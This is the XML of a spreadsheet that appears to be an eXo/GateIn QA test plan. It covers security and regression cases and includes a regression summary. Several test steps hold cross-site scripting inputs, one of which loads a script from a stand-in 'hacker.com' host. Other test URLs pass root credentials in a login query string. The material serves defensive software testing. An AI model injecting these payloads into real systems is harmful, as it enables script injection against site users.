          <table:table-cell table:style-name="ce86"/>
          <table:table-cell table:style-name="ce91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1016];[.$K4])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.M$7:.M$1016];[.$K4])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.N$7:.N$1016];[.$K4])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.O$7:.O$1016];[.$K4])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce98" table:number-columns-repeated="214"/>
          <table:table-cell table:style-name="ce79" table:number-columns-repeated="18"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce66"/>
          <table:table-cell table:style-name="ce72"/>
          <table:table-cell table:style-name="ce66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f:=COUNTIF([.L$7:.L$1016];[.$K5])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.M$7:.M$1016];[.$K5])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.N$7:.N$1016];[.$K5])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce94" table:formula="of:=COUNTIF([.O$7:.O$1016];[.$K5])" office:value-type="float" office:value="0">
            <text:p>0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce66" table:number-columns-repeated="232"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce67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Link</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73" office:value-type="string">
            <text:p>Bug Descriptions</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>Tester</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>IE7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>FireFox3.5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73">
            <text:p>Comment/Bug</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce73" table:number-columns-repeated="4"/>
          <table:table-cell table:style-name="ce99" table:number-columns-repeated="211"/>
          <table:table-cell table:style-name="ce79" table:number-columns-repeated="17"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce149" office:value-type="float" office:value="1">
            <text:p>1.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_03</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce150" office:value-type="float" office:value="1">
            <text:p>1.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce151" table:formula="of:=[.B7]" office:value-type="string" office:string-value="Tech_PRL_03">
            <text:p>Tech_PRL_03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83" office:value-type="string">
            <text:p>Step 1: In public mode (logged out) input url to access Home Page</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>Input <text:a xlink:href="http://localhost:8080/portal/login?initialURI=%2Fportal%2Fprivate%2Fintranet&amp;username=root&amp;password=gtn">http://localhost:8080/portal/login?initialURI=%2Fportal%2Fprivate%2Fintranet&amp;username=root&amp;password=gtn</text:a> to access portal</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>The loaded page is a logged-in as root Portal page</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>Medium</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce156" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce93" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce100"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce149" office:value-type="float" office:value="2">
            <text:p>2.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_03</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce150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51" table:formula="of:=[.B8]" office:value-type="string" office:string-value="Tech_PRL_03">
            <text:p>Tech_PRL_03</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Test Direct Input of a url with root user/pwd to connect to “Registry Page”</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>Step 1: In public mode (logged out) input url to access Registry Page</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>Input <text:a xlink:href="http://localhost:8080/portal/login?initialURI=%2Fportal%2Fprivate%2Fintranet%2Fadministration%2Fregistry&amp;username=root&amp;password=gtn">http://localhost:8080/portal/login?initialURI=%2Fportal%2Fprivate%2Fintranet%2Fadministration%2Fregistry&amp;username=root&amp;password=gtn</text:a> to access Registry</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>The loaded page is a logged-in as root Registry page</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce84" office:value-type="string">
            <text:p>Medium</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce85"/>
          <table:table-cell table:style-name="ce156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4">
          <table:table-cell table:style-name="ce149" office:value-type="float" office:value="3">
            <text:p>3.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_04</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15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1" table:formula="of:=[.B9]" office:value-type="string" office:string-value="Tech_PRL_04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53" office:value-type="string">
            <text:p>Step 1: Check when create new user with user 's lastname and firstname contains script</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>- Login by admin</text:p>
            <text:p>- Go to Add Users</text:p>
            <text:p>- <text:span text:style-name="T7"><text:s/>Input <text:s/></text:span><text:span text:style-name="T7">&lt;script&gt;alert('</text:span><text:span text:style-name="T7">test')&lt;/script&gt; </text:span><text:span text:style-name="T7">at first-name </text:span><text:span text:style-name="T7">or last name</text:span></text:p>
            <text:p><text:span text:style-name="T7">- Input other </text:span><text:span text:style-name="T7">requires</text:span></text:p>
            <text:p><text:span text:style-name="T7">- Click Save</text:span></text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:style-name="ce155" office:value-type="string">
            <text:p>Show message alert: "Only letters or spaces are allowed for the field "First Name:" " or "Last Name"</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p/>
            <text:p>EXOGTN-408</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce157" office:value-type="string">
            <text:p>XSS issue with user 's lastname and firstname </text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce96" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro28">
          <table:table-cell table:style-name="ce149">
            <text:p/>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_04</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15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1" table:formula="of:=[.B10]" office:value-type="string" office:string-value="Tech_PRL_04">
            <text:p>Tech_PRL_04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53" office:value-type="string">
            <text:p>Step 2: Check when edit last name or first name contain script</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>- Login as admin</text:p>
            <text:p>- Go to "Users and groups management"</text:p>
            <text:p>- Select a user and click the "Edit User Info" icon</text:p>
            <text:p>- In the "First Name" or "Last Name" filed type in something like "&lt;script&gt;alert("hello");&lt;/script&gt;"</text:p>
            <text:p>- Click the "Save" button. </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce155" office:value-type="string">
            <text:p>Show message alert: "Only letters or spaces are allowed for the field "First Name:" " or "Last Name"</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p/>
            <text:p>EXOGTN-406</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce157"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce96" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro28">
          <table:table-cell table:style-name="ce149" office:value-type="float" office:value="4">
            <text:p>4.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_05</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce150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1" table:formula="of:=[.B11]" office:value-type="string" office:string-value="Tech_PRL_05">
            <text:p>Tech_PRL_05</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce122" office:value-type="string">
            <text:p>Check XSS in membership description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Step 1: Check XSS in membership description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce154" office:value-type="string">
            <text:p>- Login by John</text:p>
            <text:p>- Add/edit membership</text:p>
            <text:p>Input name for membership</text:p>
            <text:p>Input description: &lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://hacker.com/xss.js"&gt;&lt;/SCRIPT&gt;</text:p>
            <text:p>- Click Save</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153"/>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-1153</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce157" office:value-type="string">
            <text:p>XSS vulnerability in membership description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce158"/>
          <table:table-cell table:style-name="ce96" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro29">
          <table:table-cell table:style-name="ce149" office:value-type="float" office:value="5">
            <text:p>5.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_06</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce150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1" table:formula="of:=[.B12]" office:value-type="string" office:string-value="Tech_PRL_06">
            <text:p>Tech_PRL_06</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce124" office:value-type="string">
            <text:p>Check XSS in dashboard new page creation by basic</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Step 1: Check when add page basic</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>- Login by admin</text:p>
            <text:p>- Go to Dashboard page</text:p>
            <text:p>- Click on the "plus" button to add new page and set "&lt;script&gt;alert('hi');&lt;/script&gt;" as its name</text:p>
            <text:p>- Click Enter</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Show message alert: "invalid name”</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-403</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153"/>
          <table:table-cell table:style-name="ce158" office:value-type="string">
            <text:p>N/A on PLF 3.0.x</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce96" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro30">
          <table:table-cell table:style-name="ce149" office:value-type="float" office:value="6">
            <text:p>6.00</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_07</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15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1" table:formula="of:=[.B13]" office:value-type="string" office:string-value="Tech_PRL_07">
            <text:p>Tech_PRL_07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53" office:value-type="string">
            <text:p>Step 1: Check when add page advantage</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>- Login by admin</text:p>
            <text:p>- Go to Dashboard page</text:p>
            <text:p>- Click Add new page</text:p>
            <text:p>- put "whatever" to node name and "&lt;script&gt;alert('hi');&lt;/script&gt;" as node description "&lt;script&gt;alert('hi');&lt;/script&gt;" as its name</text:p>
            <text:p>- Click Enter</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Add new page successfully</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-414</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce157" office:value-type="string">
            <text:p>XSS issue in dashboard new page creation</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce158"/>
          <table:table-cell table:style-name="ce96" table:number-columns-repeated="235"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro31">
          <table:table-cell table:style-name="ce149">
            <text:p/>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_07</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce150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1" table:formula="of:=[.B14]" office:value-type="string" office:string-value="Tech_PRL_07">
            <text:p>Tech_PRL_07</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce152"/>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>Step 2: Check view tab name when it contains sctipt</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>- Click on name of new page</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce83" office:value-type="string">
            <text:p>page name is "&lt;script&gt;alert('test')&lt;/script&gt;" </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce153" office:value-type="string">
            <text:p>Low</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146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1"/>
          <table:table-cell table:style-name="ce92"/>
          <table:table-cell table:style-name="ce93"/>
          <table:table-cell table:style-name="ce96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4"/>
          <table:table-cell table:style-name="ce102"/>
          <table:table-cell table:style-name="ce92"/>
          <table:table-cell table:style-name="ce93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2"/>
          <table:table-cell table:style-name="ce87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0" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce83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6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8" table:number-columns-repeated="2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97"/>
          <table:table-cell table:style-name="ce93" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce97" table:number-columns-repeated="235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2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3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6" table:number-columns-repeated="238"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="9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 table:number-columns-repeated="3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/>
          <table:table-cell table:style-name="ce89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5"/>
          <table:table-cell table:style-name="ce84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8"/>
          <table:table-cell table:style-name="ce41"/>
          <table:table-cell table:style-name="ce77"/>
          <table:table-cell table:style-name="ce81" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce84"/>
          <table:table-cell table:style-name="ce83" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce88"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="247"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="8"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="247"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="8"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="247"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="8"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="247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style-name="ce6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row table:style-name="ro32">
          <table:table-cell table:style-name="ce159" office:value-type="string" table:number-columns-spanned="6" table:number-rows-spanned="2">
            <text:p>Regressions List</text:p>
            <text:p><text:span text:style-name="T8">Based on </text:span><text:span text:style-name="T8">document </text:span><text:span text:style-name="T8">version: </text:span><text:span text:style-name="T8">3.2.x</text:span></text:p>
          </table:table-cell>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell/>
          <table:table-cell table:number-columns-repeated="244"/>
        </table:table-row>
        <table:table-row table:style-name="ro32">
          <table:covered-table-cell table:style-name="ce159"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce163"/>
          <table:covered-table-cell table:style-name="ce164"/>
          <table:table-cell table:number-columns-repeated="244"/>
        </table:table-row>
        <table:table-row table:style-name="ro33">
          <table:table-cell table:style-name="ce160" office:value-type="string">
            <text:p>Id</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce164" office:value-type="string">
            <text:p>Functional Group</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce164" office:value-type="string">
            <text:p>Functionality</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce164" office:value-type="string">
            <text:p>Functionality summary</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce171" office:value-type="string">
            <text:p>Product bugID</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce164" office:value-type="string">
            <text:p>Total Cases</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="244"/>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_01</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>c1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>Crash</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Use a group without having any data on this group in the JCR (data exists by default).</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41"/>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Data.B$5:Data.B$1012]=[.$A4])*([Data.A$5:Data.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="1">
            <text:p>1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2">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_02</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>c2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce126" office:value-type="string">
            <text:p>Keep data</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Migration test to upgrade GateIn to a higher version while keeping the data.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41"/>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Migration_Upgrade.B$5:Migration_Upgrade.B$1012]=[.$A5])*([Migration_Upgrade.A$5:Migration_Upgrade.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="1">
            <text:p>1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2">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_03</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>c3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce125" office:value-type="string">
            <text:p>DirectURL input</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Test Direct Input of a url with root user/pwd to connect to “Home Page”</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce41"/>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Security.B$5:Security.B$1012]=[.$A6])*([Security.A$5:Security.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="2">
            <text:p>2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2">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_04</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>c4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce125" office:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce122" office:value-type="string">
            <text:p>Check when user 's last name and first name contains script</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p/>
            <text:p>EXOGTN-408</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Security.B$5:Security.B$1012]=[.$A7])*([Security.A$5:Security.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="2">
            <text:p>2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2">
          <table:table-cell table:style-name="ce41" office:value-type="string">
            <text:p>Tech_PRL_05</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>c5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce125" office:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce122" office:value-type="string">
            <text:p>Check XSS in membership description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-1153</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Security.B$5:Security.B$1012]=[.$A8])*([Security.A$5:Security.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="1">
            <text:p>1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41" office:value-type="string">
            <text:p>Tech_PRL_06</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165" office:value-type="string">
            <text:p>c6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce125" office:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce123" office:value-type="string">
            <text:p>Check XSS in dashboard new page creation by basic</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-403</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Security.B$5:Security.B$1012]=[.$A9])*([Security.A$5:Security.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="1">
            <text:p>1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41" office:value-type="string">
            <text:p>Tech_PRL_07</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce165"/>
          <table:table-cell table:style-name="ce125" office:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce124" office:value-type="string">
            <text:p>Check XSS in dashboard new page creation by advantage</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce146" office:value-type="string">
            <text:p>EXOGTN-414</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce172" table:formula="of:=SUMPRODUCT(([Security.B$5:Security.B$1012]=[.$A10])*([Security.A$5:Security.A$1012]&lt;&gt;&quot;&quot;))" office:value-type="float" office:value="2">
            <text:p>2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34">
          <table:table-cell table:style-name="ce162" office:value-type="string">
            <text:p>TOTAL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce166"/>
          <table:table-cell table:style-name="ce168" table:number-columns-repeated="3"/>
          <table:table-cell table:style-name="ce173" table:formula="of:=SUM([.F4]+[.F5]+[.F6]+[.F7]+[.F8]+[.F9]+[.F10])" office:value-type="float" office:value="10">
            <text:p>10</text:p>
          </table:table-cell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174" table:number-columns-repeated="3"/>
          <table:table-cell table:style-name="ce175"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style-name="ce65" table:number-columns-repeated="3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7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44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44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44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44" table:number-columns-repeated="3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9"/>
          <table:table-cell table:style-name="ce144" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce172"/>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce65"/>
          <table:table-cell table:number-columns-repeated="241"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce161"/>
          <table:table-cell table:style-name="ce165"/>
          <table:table-cell table:style-name="ce167"/>
          <table:table-cell table:style-name="ce170" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce172"/>
          <table:table-cell table:style-name="ce65" table:number-columns-repeated="3"/>
          <table:table-cell table:number-columns-repeated="241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row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="25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Migration_Upgrade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Migration_Upgrade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Migration_Upgrade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Migration_Upgrade.$G$13" table:expression="$#REF!.$A$13:$G$20"/>
        <table:named-expression table:name="Cont_24" table:base-cell-address="$Migration_Upgrade.$G$25" table:expression="$#REF!.$A$21:$G$26"/>
        <table:named-expression table:name="Cont_25" table:base-cell-address="$Migration_Upgrade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Migration_Upgrade.$G$40" table:expression="$#REF!.$A$49:$G$59"/>
        <table:named-expression table:name="Cont_29" table:base-cell-address="$Migration_Upgrade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date-style style:name="N228">
      <number:month number:textual="true"/>
      <number:text>- </number:text>
      <number:day/>
      <number:text>- </number:text>
      <number:year/>
    </number:date-style>
    <number:date-style style:name="N229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8/10/2012</text:date>, <text:time>15:2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0T15:27:48</dc:date>
    <meta:print-date>2008-06-17T00:45:47</meta:print-date>
    <dc:language>en-US</dc:language>
    <meta:editing-cycles>760</meta:editing-cycles>
    <meta:editing-duration>PT304H15M17S</meta:editing-duration>
    <dc:creator>exoplatform </dc:creator>
    <meta:document-statistic meta:table-count="6" meta:cell-count="357" meta:object-count="1"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>